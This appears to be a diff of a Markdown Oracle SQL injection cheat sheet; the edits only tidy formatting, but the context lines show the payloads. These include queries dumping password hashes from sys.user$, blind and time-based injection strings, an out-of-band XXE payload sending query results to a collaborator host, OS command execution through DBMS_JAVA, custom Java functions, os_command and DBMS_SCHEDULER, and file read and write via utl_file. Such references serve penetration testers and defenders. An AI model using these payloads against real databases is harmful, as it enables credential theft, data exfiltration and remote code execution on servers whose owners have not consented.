@@ -2,7 +2,6 @@
 
 > Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or "inject" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications.
 
-
 ## Summary
 
 * [Oracle SQL Default Databases](#oracle-sql-default-databases)
@@ -21,13 +20,12 @@
 * [Oracle SQL Command Execution](#oracle-sql-command-execution)
     * [Oracle Java Execution](#oracle-java-execution)
     * [Oracle Java Class](#oracle-java-class)
-* [OracleSQL File Manipulation](#OracleSQL-file-manipulation)
-    * [OracleSQL Read File](#OracleSQL-read-file)
-    * [OracleSQL Write File](#OracleSQL-write-file)
+* [OracleSQL File Manipulation](#oraclesql-file-manipulation)
+    * [OracleSQL Read File](#oraclesql-read-file)
+    * [OracleSQL Write File](#oraclesql-write-file)
     * [Package os_command](#package-os_command)
     * [DBMS_SCHEDULER Jobs](#dbms_scheduler-jobs)
 * [References](#references)
-
 
 ## Oracle SQL Default Databases
 
@@ -36,14 +34,12 @@
 | SYSTEM             | Available in all versions |
 | SYSAUX             | Available in all versions |
 
-
 ## Oracle SQL Comments
 
 | Type                | Comment |
 | ------------------- | ------- |
 | Single-Line Comment | `--`    |
 | Multi-Line Comment  | `/**/`  |
-
 
 ## Oracle SQL Enumeration
 
@@ -64,7 +60,6 @@
 | Database name | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |
 | Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |
 
-
 ## Oracle SQL Database Credentials
 
 | Query                                   | Description               |
@@ -72,7 +67,6 @@
 | `SELECT username FROM all_users;`       | Available on all versions |
 | `SELECT name, password from sys.user$;` | Privileged, <= 10g        |
 | `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |
-
 
 ## Oracle SQL Methodology
 
@@ -99,7 +93,6 @@ SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
 SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
 ```
 
-
 ## Oracle SQL Error Based
 
 | Description           | Query          |
@@ -117,24 +110,21 @@ SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_N
 
 When the injection point is inside a string use : `'||PAYLOAD--`
 
-
 ## Oracle SQL Blind
 
 | Description              | Query          |
 | :----------------------- | :------------- |
-| Version is 12.2	       | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
-| Subselect is enabled	   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
+| Version is 12.2        | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
+| Subselect is enabled    | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
 | Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
 | Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
 | First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |
 
-
 ### Oracle Blind With Substring Equivalent
 
 | Function    | Example                                   |
-| ----------- | ----------------------------------------- | 
-| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     | 
-
+| ----------- | ----------------------------------------- |
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |
 
 ## Oracle SQL Time Based
 
@@ -143,13 +133,11 @@ AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
 AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
 ```
 
-
 ## Oracle SQL Out of Band
 
 ```sql
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 ```
-
 
 ## Oracle SQL Command Execution
 
@@ -186,7 +174,6 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
         SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
         ```
 
-
 ### Oracle Java Class
 
 * Create Java class
@@ -209,8 +196,7 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 
     ```sql
     SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
-    ``` 
-
+    ```
 
 ### Package os_command
 
@@ -223,7 +209,6 @@ SELECT os_command.exec_clob('<COMMAND>') cmd from dual
 ```sql
 DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
 ```
-
 
 ## OracleSQL File Manipulation
 
@@ -241,13 +226,11 @@ utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
 utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
 ```
 
-
-
 ## References
 
-- [ASDC12 - New and Improved Hacking Oracle From Web - Sumit “sid” Siddharth - November 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
-- [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
-- [ODAT: Oracle Database Attacking Tool - quentinhardy - March 24, 2016](https://github.com/quentinhardy/odat/wiki/privesc)
-- [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
-- [Pentesting Oracle TNS Listener - HackTricks - July 19, 2024](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
-- [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)
+* [ASDC12 - New and Improved Hacking Oracle From Web - Sumit “sid” Siddharth - November 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
+* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [ODAT: Oracle Database Attacking Tool - quentinhardy - March 24, 2016](https://github.com/quentinhardy/odat/wiki/privesc)
+* [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+* [Pentesting Oracle TNS Listener - HackTricks - July 19, 2024](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
+* [The SQL Injection Knowledge Base - Roberto Salgado - May 29, 2013](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)
